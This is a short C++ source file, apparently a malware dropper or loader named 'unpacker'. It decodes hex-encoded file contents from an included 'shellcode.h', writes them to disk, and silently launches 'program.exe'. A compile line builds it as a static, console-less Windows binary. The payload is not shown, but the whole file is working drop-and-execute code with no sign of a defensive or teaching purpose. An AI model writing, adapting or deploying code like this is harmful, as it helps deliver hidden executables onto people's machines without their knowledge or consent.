#include <fstream>
#include <iostream>
#include <vector>
#include <sstream>
#include <filesystem>
#include "shellcode.h"

namespace fs = std::filesystem;

void writeFileBytes(const std::string& filename, const std::string& byteCode) {
    std::ofstream outfile(filename, std::ios::binary);
    for (size_t i = 0; i < byteCode.length(); i += 2) {
        std::string byteString = byteCode.substr(i, 2);
        char byte = static_cast<char>(std::stoi(byteString, nullptr, 16));
        outfile.write(&byte, 1);
    }
    outfile.close();
}

int main() {
    for (const auto& entry : shellcodeVector) {
        std::string filename = entry.first;
        std::string byteCode = entry.second;
        writeFileBytes(filename, byteCode);
    }
    std::system("start \"\" program.exe");
    return 0;
}

// compile g++ .\unpacker.cpp -static -mwindows -Os -fdata-sections -ffunction-sections